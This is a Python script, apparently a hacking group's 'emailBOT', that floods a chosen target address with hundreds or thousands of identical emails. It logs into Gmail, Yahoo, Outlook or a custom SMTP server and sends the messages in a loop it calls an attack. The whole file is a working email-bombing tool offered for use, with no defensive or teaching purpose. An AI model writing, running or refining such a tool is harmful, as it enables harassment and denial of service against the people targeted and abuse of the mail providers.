import smtplib
import sys

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

a = 'THIS STRING'

def banner():

    print(bcolors.YELLOW + """
    
      [[[[[[[[[[[[[[[      ]]]]]]]]]]]]]]]
      [::::::::::::::      ::::::::::::::]
      [::::::::::::::      ::::::::::::::]
      [::::::[[[[[[[:      :]]]]]]]::::::]
      [:::::[   {KINGDOM FALCONS}  ]:::::]
      [:::::[          CJ          ]:::::]
      [:::::[        Shadow        ]:::::]
      [:::::[       Abo miras      ]:::::]
      [:::::[       0xSilver       ]:::::]
      [:::::[        Dr.mim        ]:::::]
      [:::::[       Abo Saleh      ]:::::]
      [:::::[      Abo Tarikhm     ]:::::]
      [:::::[      prince_hack     ]:::::]
      [:::::[      GHOST_hack      ]:::::]
      [::::::[[[[[[[:      :]]]]]]]::::::]
      [::::::::::::::      ::::::::::::::]
      [::::::::::::::      ::::::::::::::]
      [[[[[[[[[[[[[[[      ]]]]]]]]]]]]]]]
                [+] emailBOT v1.0 [+]
                
                 [Programming by CJ]


 [!This is a special tool for me group kingdom falcons!]

              $[insta:cj_johnson111]$
    
    
    """)

class Email_bot:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n[+]Initializing program [+]')
            self.target = str(input(bcolors.GREEN + 'Enter target email : '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def spam(self):
        try:
            print(bcolors.RED + '\n[+] Setting up bot [+]')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount : '))
            print(bcolors.RED + f'\n[+]You have selected SPAM mode: {self.mode} and {self.amount} emails [+]')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n[+] Setting up email [+]')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number : '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address : '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password : '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject : '))
            self.message = str(input(bcolors.GREEN + 'Enter message : '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'SPAM: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n[+] Attacking... [+]')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n[+] Attack finished [+]')
        sys.exit(0)


if __name__=='__main__':
    banner()
    spam = Email_bot()
    spam.spam()
    spam.email()
    spam.attack()

